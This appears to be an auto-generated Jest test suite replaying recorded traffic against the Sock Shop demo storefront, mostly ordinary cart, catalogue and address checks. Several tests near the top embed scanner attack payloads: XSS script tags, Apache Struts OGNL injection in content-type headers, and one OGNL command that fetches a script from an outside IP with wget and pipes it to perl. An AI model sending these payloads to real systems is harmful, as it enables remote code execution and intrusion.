const authenticate = require("./authentication");
const {CSSselect, JSONBuild, JSONPath, clearSession, dataset, getHttpClient, urlPart, urlencode} = require("./up9lib");

describe.each(dataset("data/dataset_11.json"))("test_011_get_", (_meta_http_equiv, _script_document_cookie, class_classLoader_URLs_0_, content, expression) => {
    it("test_011_get_", () => {
        clearSession();

        // GET http://front-end.sock-shop/ (endp 11)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + urlencode([["\"</script>", ""], ["\"><script>alert('struts_sa_surl_xss.nasl-1603621900')</script>", ""], ["\"><script>alert('struts_sa_surl_xss.nasl-1605657683')</script>", ""], ["\"><script>alert('struts_sa_surl_xss.nasl-1605658393')</script>", ""], ["('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)", "true"], ["(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew java.lang.Boolean(\"false\")))", ""], ["(asdf)(('\\u0023thread.sleep(5000)')(\\u0023thread\\u003d@java.lang.Thread@currentThread()))", "1"], ["<meta http-equiv", _meta_http_equiv], ["<script>document.cookie", _script_document_cookie], ["XDEBUG_SESSION_START", "phpstorm"], ["a", "fetch"], ["class.classLoader.URLs[0]", class_classLoader_URLs_0_], ["content", content], ["debug", "command"], ["expression", expression], ["ho {COMPLETE_VERSION}", ""]]), {
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#basket div.box form h1", text)).toContain("Shopping cart");
        })
        .then((data) => {
        });
    });
});

it("test_028_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 28)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_067_head_", () => {
    clearSession();

    // HEAD http://front-end.sock-shop/ (endp 67)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        method: "HEAD"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_133.json"))("test_133_get_", (PHPSESSID, action, album, category, content, dispsize, feed, id, invitaion_code, mod, mode, name, page, param, s, vars_0_, weekstartday) => {
    it("test_133_get_", () => {
        clearSession();

        // GET http://front-end.sock-shop/ (endp 133)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + urlencode([["", param], ["\u0000", ""], ["\"><script>alert(document.domain)</script>", ""], ["/'", ""], ["<script>alert(document.domain)</script>", ""], ["OpenServer", ""], ["PHPSESSID", PHPSESSID], ["XDEBUG_SESSION_START", "phpstorm"], ["a", "fetch"], ["action", action], ["album", album], ["category", category], ["cmd", "show"], ["content", content], ["cpmvc_do_action", "mvparse"], ["data", "1"], ["debug", "1"], ["dispsize", dispsize], ["f", "edit"], ["feed", feed], ["filter", "phpinfo"], ["function", "call_user_func_array"], ["id", id], ["invitaion_code", invitaion_code], ["mod", mod], ["mode", mode], ["name", name], ["op", "browse"], ["page", page], ["parent", "0"], ["q[]", "x"], ["s", s], ["show_dash_widget", "1"], ["start", "0"], ["user", ""], ["vars[0]", vars_0_], ["weekstartday", weekstartday]]))
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

it("test_134_head_", () => {
    clearSession();

    // HEAD http://front-end.sock-shop/ (endp 134)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        method: "HEAD"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_154.json"))("test_154_get_", (content) => {
    it("test_154_get_", () => {
        clearSession();

        // GET http://front-end.sock-shop/ (endp 154)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + urlencode([["a", "fetch"], ["content", content]]), {
            headers: {
                "content-type": "application/json"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

it("test_159_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 159)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_201_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 201)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-NYU'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_203_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 203)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "text/html"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_204_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 204)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('eOdVotoY'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_205_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 205)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('cpQiapAu'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_206_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 206)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('frVV3EZN'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_213_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 213)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "application/xml"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_303_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 303)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "text/xml"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_304_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 304)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_305_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 305)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmdlinux='ifconfig').(#cmdwin='ipconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_306_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 306)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('z13mXu0c'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_307_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 307)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('4IBh1a16'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_308_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 308)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('fbxxae2T'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_309_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 309)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('h3VAvCd6'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_310_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 310)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ZYbIXBxr'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_311_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 311)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('YUbHNQZB'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_312_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 312)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('cuXaxm3h'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_313_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 313)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('NdNYddIL'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_314_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 314)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('eRpkYaWi'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_316_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 316)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('gKkUkcdw'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_317_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 317)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_55.json"))("test_055_get_param", (param) => {
    it("test_055_get_param", () => {
        clearSession();

        // GET http://front-end.sock-shop/{param} (endp 55)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + param, {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#top div.container div.offer a.btn.btn-success.btn-sm", text)).toContain("Offer of the day");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_151.json"))("test_151_get_param", (param) => {
    it("test_151_get_param", () => {
        clearSession();

        // GET http://front-end.sock-shop/{param} (endp 151)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + param, {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_208.json"))("test_208_get_param1_param2_index_html", (param, param1) => {
    it("test_208_get_param1_param2_index_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/{param1}/{param2}/index.html (endp 208)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + param + "/" + param1 + "/index.html")
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_126.json"))("test_126_post_Licenses_licenseId", (licenseId) => {
    it("test_126_post_Licenses_licenseId", () => {
        clearSession();

        // POST http://front-end.sock-shop/Licenses/{licenseId} (endp 126)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/Licenses/" + licenseId, {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
                "chk": "Test"
            })
        })
        .then((response) => {
            expect(response.status).toEqual(100);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_123_get_SiteScope_", () => {
    clearSession();

    // GET http://front-end.sock-shop/SiteScope/ (endp 123)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/SiteScope/")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_068_get_address", () => {
    clearSession();

    // GET http://front-end.sock-shop/address (endp 68)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/address", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.city",
            json: data
        })).toContain("Glasgow");
    });
});

it("test_168_get_address", () => {
    clearSession();

    // GET http://front-end.sock-shop/address (endp 168)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/address", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_169.json"))("test_169_post_addresses", (number, postcode) => {
    it("test_169_post_addresses", () => {
        clearSession();

        // POST http://front-end.sock-shop/addresses (endp 169)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/addresses", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/payload_for_endp_169.json", {
                "$.number": number,
                "$.postcode": postcode
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_013_get_basket_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/basket.html (endp 13)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/basket.html")
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_014_get_basket_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/basket.html (endp 14)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/basket.html")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#basket div.box form h1", text)).toContain("Shopping cart");
    })
    .then((data) => {
    });
});

it("test_170_get_basket_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/basket.html (endp 170)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/basket.html")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#basket div.box form h1", text)).toContain("Shopping cart");
    })
    .then((data) => {
    });
});

it("test_103_get_c", () => {
    clearSession();

    // GET http://front-end.sock-shop/c (endp 103)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/c")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_070_get_card", () => {
    clearSession();

    // GET http://front-end.sock-shop/card (endp 70)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/card", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_171_get_card", () => {
    clearSession();

    // GET http://front-end.sock-shop/card (endp 171)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/card", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/dataset_172.json"))("test_172_post_cards", (ccv, expires, longNum) => {
    it("test_172_post_cards", () => {
        clearSession();

        // POST http://front-end.sock-shop/cards (endp 172)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/cards", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/payload_for_endp_172.json", {
                "$.ccv": ccv,
                "$.expires": expires,
                "$.longNum": longNum
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_016_post_cart", () => {
    clearSession();

    // POST http://front-end.sock-shop/orders (endp 21)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/orders", {
        method: "POST",
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.address.city",
            json: data
        })).toContain("Glasgow");
        const id = JSONPath({
            path: "$.items[*].itemId",
            json: data
        })[0];

        // POST http://front-end.sock-shop/cart (endp 16)
        return front_end_sock_shop.fetch("/cart", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/payload_for_endp_16.json", {
                "$.id": id
            })
        })
        .then((response) => {
            expect(response.status).toEqual(201);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/dataset_33.json"))("test_033_post_cart", (size, tags) => {
    it("test_033_post_cart", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 17)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // POST http://front-end.sock-shop/cart (endp 33)
            return front_end_sock_shop.fetch("/cart", {
                method: "POST",
                headers: {
                    "content-type": "application/json"
                },
                body: JSONBuild("data/payload_for_endp_33.json", {
                    "$.id": id
                })
            })
            .then((response) => {
                expect(response.status).toEqual(202);
                return response.text();
            })
            .then((text) => {
            })
            .then((data) => {
            });
        });
    });
});

it("test_039_delete_cart", () => {
    clearSession();

    // DELETE http://front-end.sock-shop/cart (endp 39)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        method: "DELETE"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", text)).toContain("You may also like these products");
    })
    .then((data) => {
    });
});

it("test_047_get_cart", () => {
    clearSession();

    // GET http://front-end.sock-shop/cart (endp 47)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_063_get_cart", () => {
    clearSession();

    // GET http://front-end.sock-shop/cart (endp 63)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#copyright div.container div p.pull-left a", text)).toContain("Weaveworks");
    })
    .then((data) => {
    });
});

it("test_174_post_cart", () => {
    clearSession();

    // GET http://front-end.sock-shop/cart (endp 146)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$[*].id",
            json: data
        })).not.toBeNull();
        const id = JSONPath({
            path: "$[*].itemId",
            json: data
        })[0];

        // POST http://front-end.sock-shop/cart (endp 174)
        return front_end_sock_shop.fetch("/cart", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/payload_for_endp_174.json", {
                "$.id": id
            })
        })
        .then((response) => {
            expect(response.status).toEqual(201);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

it("test_175_delete_cart", () => {
    clearSession();

    // DELETE http://front-end.sock-shop/cart (endp 175)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        method: "DELETE",
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(202);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_286_delete_cart", () => {
    clearSession();

    // DELETE http://front-end.sock-shop/cart (endp 286)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/cart", {
        method: "DELETE",
        headers: {
            "content-type": "application/x-www-form-urlencoded",
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(202);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_046_get_catalogue", () => {
    clearSession();

    // GET http://front-end.sock-shop/catalogue (endp 46)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/catalogue")
    .then((response) => {
        expect(response.status).toEqual(201);
        return response.text();
    })
    .then((text) => {
        return JSON.parse(text);
    })
    .then((data) => {
        expect(JSONPath({
            path: "$.address.city",
            json: data
        })).toContain("Glasgow");
    });
});

describe.each(dataset("data/dataset_65.json"))("test_065_get_catalogue", (size) => {
    it("test_065_get_catalogue", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 65)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["size", size]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

